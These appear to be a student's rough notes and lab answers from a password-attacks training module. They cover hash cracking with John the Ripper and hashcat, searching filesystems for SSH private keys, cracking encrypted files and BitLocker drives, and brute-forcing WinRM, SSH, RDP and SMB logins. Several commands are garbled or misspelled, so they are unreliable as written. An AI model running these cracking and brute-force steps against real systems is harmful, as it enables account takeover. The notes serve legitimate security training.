attacking passwords, let's take a moment to discuss authentication and its components.
\\authentication
Authentication
Authentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:

Something you know: a password, passcode, pin, etc.
Something you have: an ID Card, security key, or other MFA tools
Something you are: your physical self, username, email address, or other identifiers
Somewhere you are: geolocation, IP address, etc.
\\The use of passwords
https://haveibeenpwned.com/
Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker. Hashing is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are MD5, and SHA-256.
Take the password Soccer06! for example. The corresponding MD5 and SHA-256 hashes can be generated with the following commands:
$echo -n Soccer06! | md5sum
$echo -n Soeccer06! | sha256sum
Hash functions are designed to work in one direction. This means it should not be possible to figure out what the original password was based on the hash alon
Common techniques are to use rainbow tables, to perform dictionary attacks, and typically as a last resort, to perform brute-force attacks.
\\Rainbow Tables
Rainbow tables are large pre-compiled maps of input and output values for a given hash functio used to very quickly identify the password if its corresponding hash has already been mapped.
Password	MD5 Hash
123456	e10adc3949ba59abbe56e057f20f883e
12345	827ccb0eea8a706c4c34a16891f84e7b

Because rainbow tables are such a powerful attack, salting is used. A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed
To maximize impact, salts should not be reused, e.g. for all passwords stored in one database. For example, if the salt Th1sIsTh3S@lt_ is prepended to the same password, the MD5 hash would now be as follows:
$echo -n Th1sIsTh3S@lt_Soccer06! | md5sum
A salt is not a secret value — when a system goes to check an authentication request  it needs to know what salt was used so that it can check if the password hash matches For this reason, salts are typically prepended to corresponding hashes.
- To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of just one single byte would mean the 15 billion entries from before would have to be 3.84 trillion (factor of 256).
\\Brute-force attack
A brute-force attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (<9 characters) are viable targets, even on consumer hardware. Brute-forcing is the only password cracking technique that is 100% effective -
Brute-force attempt	MD5 Hash
...SNIP...	...SNIP...
Sxejd	2cdc813ef26e6d20c854adb107279338

Note: Brute-forcing speeds depend heavily on the hashing algorithm and hardware that is used. On a typical company laptop, a tool like hashcat might be able to guess over five million passwords per second when attacking MD5, while at the same time only managing ten thousand per second when targeting a DCC2 hash.
\\Dictionary attack
A dictionary attack, otherwise known as a wordlist attack, is one of the most efficient techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are rockyou.txt and those included in SecLists.
kinlingit@htb[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt 
\\==================================
Introduct to John the Ripper
als jtr aka john is a well-known pentest tool used for cracking password through various atk including brute-force and dictionary. 
-the jumbo variant is recomemend for performance optimizations, additionla feature such as multingual wordlist, 64-bit architecture.
carcker the greater password and accuracy and speed . 
\\Cracking modes 
Single crack mode is  e is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and GECOS values (full name, room number, phone number, etc.). T
Note: The Linux authentication process, as well as cracking rules, will be covered in-depth in later sections. The following example is simplified for demonstration purposes.
EX: Imagine we as attackers came across the file passwd with the following contents:
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
Based on the contents of the file, it can be inferred that the victim has the username r0lf, the real name Rolf Sebastian, and the home directory /home/r0lf. Single crack mode will use this information to generate candidate passwords and test them against the hash. We can run the attack with the following command:
$john --single passwd
\\Wordlist mode
ordlist mode is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:
$john --wordlist=<wordlist_file> <hash_file> 
--rules argumen for generate candidate password more widely
The wordlist file (or files) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the --rules argument. 
\\Incremental mode
Incremental mode is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (Markov chains). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.
https://en.wikipedia.org/wiki/Markov_chain
This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist, in contrast to wordlist mode. Unlike purely random brute-force attacks, Incremental mode uses a statistical model to make educated guesses, resulting in a significantly more efficient approach than naïve brute-force attacks.
$john --incremental <hash_file>
You can customize these or define your own to target passwords that use special characters or specific patterns.
\\creating our owwn password wordlist
$grep '# Incremental mod' -A 100 /etc/john/john.conf 
Note: This mode can be resource-intensive and slow, especially for long or complex passwords. Customizing the character set and length can improve performance and focus the attack.
\\Identifying hash formats
https://openwall.info/wiki/john/sample-hashes
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
Both sources list multiple example hashes as well as the corresponding JtR format
https://github.com/psypanda/hashID  By adding the -j flag, hashID will, in addition to the hash format, list the corresponding JtR format:
$hashid -j 193069ceb0461e1d40d216e32c79c704  -> unclear result
JtR supports hundreds of hash formats, some of which are listed in the table below. The --format argument can be supplied to instruct JtR which format target hashes have.
$john --format
\\Cracking files
It is also possible to crack password-protected or encrypted files with JtR. Multiple "2john" tools come with JtR that can be used to process files and produce hashes compatible with JtR. The generalized syntax for these tools is:
$<tool like rar2john> <file to crack> > file.hash to get hash
$locate *2john*
<test>Use single-crack mode to crack r0lf's password.
echo -n 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > hash.txt
john --single hash.txt
<test>Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.
echo -n '193069ceb0461e1d40d216e32c79c704' > hash.txt tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
john --wordlist=<wordlist_file> <hash_file> 
john --format=ripemd-128 --wordlist=./rockyou.txt hash.txt >cat ~/.john/john.pot | grep <hash>
\\=====================================
Introduction to Hashcat
Hashcat is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Similar to JtR, hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.
$hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ....]
-a is specify the atk mode    -m is specify the hash type   <hashes>either a hash string or a file containing one or more password hashes of the same type
[wordlist, rule, mask ] is placeholder for additional arguments that depend of the atk mode
\\Hash types
Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running hashcat --help.
$hashcat --help
The hashcat website hosts a comprehensive list of example hashes which can assist in manually identifying an unknown hash type and determining the corresponding Hashcat hash mode identifier.
https://hashcat.net/wiki/doku.php?id=example_hashes
https://github.com/psypanda/hashID can be used to quickly identify the hashcat hash type by specifying the -m argument.
$hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
\\Attack modes
Hashcat has many different attack mode, including dictionary, mask, combinator, and association. In this section we will go over the first two, as they are likely the most common ones that you will need to use.
\\Dictionary attack
Dictionary attack (-a 0) is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.
EX:As an example, imagine we extracted the following password hash from an SQL database: e3e3ec5831ad5e7288241960e5d4fdb8. First, we could identify this as an MD5 hash, which has a hash ID of 0. To attempt to crack this hash using the rockyou.txt wordlist, the following command would be used:
$hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
A wordlist alone is often not enough to crack a password hash. As was the case with JtR, rules can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under /usr/share/hashcat/rules:
$ls /usr/share/hashcat/rules
As another example, imagine an additional md5 hash was leaked from the SQL database: 1b0556a75770563578569ae21392630c. We weren't able to crack it using rockyou.txt alone, so in a subsequent attempt, we might apply some common rule-based transformations. One ruleset we could try is best64.rule, which contains 64 standard password modifications—such as appending numbers or substituting characters with their "leet" equivalents. To perform this kind of attack, we would append the -r <ruleset> option to the command, as shown below
$hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
\\Mask Attack
(-a 3) is a type of brute-force atk  attack in which the keyspace is explicitly defined by the user
example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.
A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set. Hashcat includes several built-in character sets:
Symbol	Charset
?l	abcdefghijklmnopqrstuvwxyz
?u	ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d	0123456789
?h	0123456789abcdef
?H	0123456789ABCDEF
?s	«space»!"#$%&'()*+,-./:;<=>?@[]^_`{
?a	?l?u?d?s
?b	0x00 - 0xff
Custom charsets can be defined with the -1, -2, -3, and -4 arguments, then referred to with ?1, ?2, ?3, and ?4.
Let's say that we specifically want to try passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol. The resulting hashcat mask would be ?u?l?l?l?l?d?s.
$hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
<test>Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$hashcat -a 0 -m 0 <hash> ./rockyou.txt

Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)
$hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c ./rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

$hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
\\=================================================
Writing Custom Wordlists and RUles
Many users create their passwords based on simplicity rather than security
Basic OSINT (Open Source Intelligence) techniques can be highly effective in uncovering such personal information and may assist in password guessing. More information about OSINT can be found in the OSINT: Corporate Recon module.
https://hashcat.net/wiki/doku.php?id=rule_based_attack
cat custom.rule
:	Do nothing
l	Lowercase all letters
u	Uppercase all letters
c	Capitalize the first letter and lowercase others
sXY	Replace all instances of X with Y
$!	Add the exclamation character at the end
$hashcat --force password.list -r custom.rule -r custom.rule --stdout | sort -u > mut_password.list
Hashcat and JtR both come with pre-built rule lists that can be used for password generation and cracking. One of the most effective and widely used rulesets is best64.rule
We can narrow this down and perform more targeted guessing if we have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords have been leaked and directly obtained.
\\Generating wordlists using CeWL
$cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
$wc -l inlane.wordlist
\\Exercise
For this sections exercise, imagine that we compromised the password hash of a work email belonging to Mark White. After performing a bit of OSINT, we have gathered the following information about Mark:

He was born on August 5, 1998
He works at Nexura, Ltd.
The company's password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number
He lives in San Francisco, CA, USA
He has a pet cat named Bella
He has a wife named Maria
He has a son named Alex
He is a big fan of baseball

97268a8ae45ac7d15c3cea4ce6ea550b
$create a password list
$create a rule
run the hashcat with password list and rule
$hashcat -a 3 -m 0 <password-list> -r <rule.rule>
$hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
$cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
c - Capitalize the first character, lowercase the rest C - Lowercase the first character, uppercase the rest t - Toggle the case of all characters in a word $! - Appends the character ! to the end $1$9$9$8 - Appends '1998' to the end $1$9$9$8$! - Appends '1998!' to the end sa@ - Replace all instances of a with @ so0 - Replace all instances of o with 0 ss$ - Replace all instances of s with $
mask attack
$hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
\\\\\\\\\\==========================================
Cracking Protected files
The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the General Data Protection Regulation (GDPR) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss confidential topics or transmit sensitive data via email, which may be intercepted by attackers positioned to exploit these communication channels
\\Hunting for Encrypted files
Many different extensions correspond to encrypted files—a useful reference list can be found on FileInfo. As an example, consider this command we might use to locate commonly encrypted files on a Linux system:
https://fileinfo.com/filetypes/encoded
$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
\\Hunting for SSH keys
$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
$ cat /home/jsmith/.ssh/SSH.private
One way to tell whether an SSH key is encrypted or not, is to try reading the key with ssh-keygen.
$ ssh-keygen -yf ~/.ssh/id_ed25519 
As shown below, attempting to read a password-protected SSH key will prompt the user for a passphrase:
\\Cracking encrypted SSH keys
$ locate *2john*
$ ssh2john.py SSH.private > ssh.hash
$ john --wordlist=rockyou.txt ssh.hash  > $ john ssh.hash --show
\\Cracking password-protected documents
$office2john.py Protected.docx > protected-docx.hash
$john --wordlist=rockyou.txt protected-docx.hash
$john protected-docx.hash --show
\\Cracking Protected Archives
https://fileinfo.com/filetypes/compressed
$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
- Note that not all archive types support native password protection, and in such cases, additional tools are often used to encrypt the files. For example, TAR files are commonly encrypted using openssl or gpg.
\\Cracking ZIP files
$zip2john ZIP.zip > zip.hash
$cat zip.hash
$john --wordlist=rockyou.txt zip.hash  >  john zip.hash --show
\\Cracking OpenSSL encrypted GZIP files
$file GZIP.gzip 
When cracking OpenSSL encrypted files, we may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the openssl tool within a for loop that attempts to extract the contents directly, succeeding only if the correct password is found.
The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.
$for i in $(cat rockyou.txt);do
openssl enc -ase-250-cbc -d -in GZIP.gzip -k $i 
2>/dev/null| tar xz;done
Once the for loop has finished, we can check the current directory for a newly extracted file.
\\==============================
Cracking BitLocker-encrypted drives
bitlocker2john to four different hashes: the first two correspond to the BitLocker password, while the latter two represent the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess—unless partial knowledge is available. Therefore, we will focus on cracking the password using the first hash ($bitlocker$0$...).
$bitlocker2john -i Backup.vhd > backup.hashes
$grep "bitlocker\$0" backup.hashes > backup.hash
$cat backup.hash
-Once a hash is generated, either JtR or hashcat can be used to crack it. For this example, we will look at the procedure with hashcat. The hashcat mode associated with the $bitlocker$0$... hash is -m 22100. We supply the hash, specify the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.
$hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
After successfully cracking the password, we can access the encrypted drive.
\\Mounting BitLocker-encrypted drives in Windows
The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.
\\Mounting Bitlocker-encrypted drives in Linux (or macOS)
It is also possible to mount BitLocker-encrypted drives in Linux (or macOS). To do this, we can use a tool called dislocker. First, we need to install the package using apt:
$sudo apt-get install dislocker
$sudo mkdir -p /media/bitlocker
$sudo mkdir -p /media/bitlockermount
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:
$sudo losetup -f -P Backup.vhd
$sudo dislocker /dev/loop0p2 - u1234qwer -- /media/bitlocker
$sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
If everything was done correctly, we can now browse the files:
cd /media/bitlockermount/
$ls -la 
-Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:
sudo unmount /media/bitlockermount
$sudo unmount /media/bitlocker
94.237.49.23:47272
<test>Run the above target then navigate to http://ip:port/download, 
then extract the downloaded file. Inside, you will find a password-protected VHD file.
Crack the password for the VHD and submit the recovered password as your answer.
$bitlocker2john -i Backup.vhd > backup.hashes
$grep "bitlocker\$0" backup.hashes > backup.hash
$cat backup.hash
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.tx

<test>Mount the BitLocker-encrypted VHD and enter the contents of flag.txt as your answer.
$sudo apt-get install dislocker
$sudo mkdir -p /media/bitlocker
$sudo mkdir -p /media/bitlockermount
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:
$sudo losetup -f -P Backup.vhd
$sudo losetup -a > lsblk -o Nlsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
$sudo dislocker /dev/loop0p2 -u'1234qwer' -- /media/bitlocker
$sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
If everything was done correctly, we can now browse the files:
cd /media/bitlockermount/
$ls -la 
-Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:
sudo unmount /media/bitlockermount
$sudo unmount /media/bitlocker
\\\\\===============================================
Network services

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, and LDAP.
In this case, the most common services suitable for this are RDP, WinRM, and SSH. SSH is not as common on Windows, but it is the leading service for Linux-based systems.
All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.+
\\WinRM Windows Remote Management is the Microsoft implementation of the Web Services Management Protocol (WS-Management
-It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM).
-For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
- handy tool that we can use for our password attacks is NetExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation for this tool to become familiar with it.
\\Netexec https://github.com/Pennyw0rth/NetExec https://www.netexec.wiki/
\\Installing NetExec

We can install NetExec with apt, or clone the GitHub repo and follow the various installation methods, such as installing from source and avoiding dependency issues.
$sudo apt-get -y install netexec
\\NetExec Menu options 
$netexec -h 
\\NetExec Protocol-Specific help
Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.
$netexec smb -h 
\\NetExec Usage
$netexec <proto> <target-IP> -u <user or userlist> -p <passoword or password list>
As an example, this is what attacking a WinRM endpoint might look like:
$netexec winrm 10.129.42.197 -u user.list -p password.list
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
\\Evil-WinRM

\\Installing Evil-WinRM

$sudo gem install evil-winrm
\\Evil-WinRM Usage
$evil-winrm -i <target-IP> -u <user name> -p <password>
If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.
\\SSH
\\Symmetric Encryption
use same key for encryptiong and decryption Anyone who has access to the key could also access the transmitted data
Therefore, a key exchange procedure is needed for secure symmetric encryption. The Diffie-Hellman key exchange method is used for this purpose
If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.
\\Asymmetric Encryption
Asymmetric encryption uses two keys: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.
\\Hashing 
The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.
\\Hydra SSH

We can use a tool like Hydra to brute force SSH. This is covered in-depth in the Login Brute Forcing module.
$hydra -L user.list -P password.list ssh://10.129.42.197
To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
$ssh user@<ip>
\\Remote Desktop Protocol (RDP)

-Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default
RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization
The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled
In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there.
-Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.
\\Hydra-RDP

We can also use Hydra to perform RDP bruteforcing.
$hydra -L user.list -P password.list rdp://10.129.42.197
-Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others. For our purposes, we will work with xfreerdp.
\\xfreerdp

$xfreerdp /v:<target -IP> /u:<username> /p:<password>
\\SMB

Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.
SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. For SMB, we can also use hydra again to try different usernames in combination with different passwords.
\\Hydra-SMB

$hydra -L user.list -P password.list smb://10.129.42.197
However, we may also get the following error describing that the server has sent an invalid reply.
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
\\Metasploit

$msfconsole -q
msf>use auxiliary/scanner/smb/smb_login > options >
>set user_file user.list > set pass_file password.list
>set rhosts 10.129.42.197 >run
Now we can use NetExec again to view the available shares and what privileges we have for them.
$netexec smb 10.129.42.197 -u "user" -p "password" --shares
-To communicate with the server via SMB, we can use, for example, the tool smbclient. This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
\\smbclient

$smbclient -U user \\\\10.129.42.197\\SHARENAME

<test>Find the user for the WinRM service and crack their password. Then, when you log in, you will 
find the flag in a file there. Submit the flag you found as the answer.
$nmap -A <targetIP>
$sudo gem install evil-winrm
$evil-winrm -i <target-IP> -u <user name> -p <password>
$ssh user@<ip>
</alter>
$sudo apt-get -y install netexec
$netexec <proto> <target-IP> -u <user or userlist> -p <passoword or password list>
</alter>
 crackmapexec winrm 10.129.239.240 -u username.list -p password.list
 evil-winrm -i STMIP -u john -p november
 Get-ChildItem -Path ., .. -Recurse -Filter "flag*"
 type C:\Users\john\Desktop\flag.txt
WINSRV\john:november
<test>Find the user for the SSH service and crack their password. Then, when you log in, you will find 
he flag in a file there. Submit the flag you found as the answer.
$hydra -L user.list -P password.list ssh://10.129.42.197
type .\Desktop\flag.txt

<test>Find the user for the RDP service and crack their password. Then, when you log in, you will find 
the flag in a file there. Submit the flag you found as the answer.
$hydra -L user.list -P password.list rdp://10.129.42.197
$xfreerdp /v:<target -IP> /u:<username> /p:<password>
xfreerdp /v:STMIP /u:chris /p:789456123

<test> Find the user for the SMB service and crack their password. Then, when you log evin, you will find
 the flag in a file there. Submit the flag you found as the answer.
 $hydra -L user.list -P password.list smb://10.129.42.197
 </alter>
 msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
set VERBOSE false
run

 smbclient -U cassie -L '\\10.129.202.136\'
  smbclient -U cassie  '\\10.129.202.136\CASSIE'
 dir
get flag.txt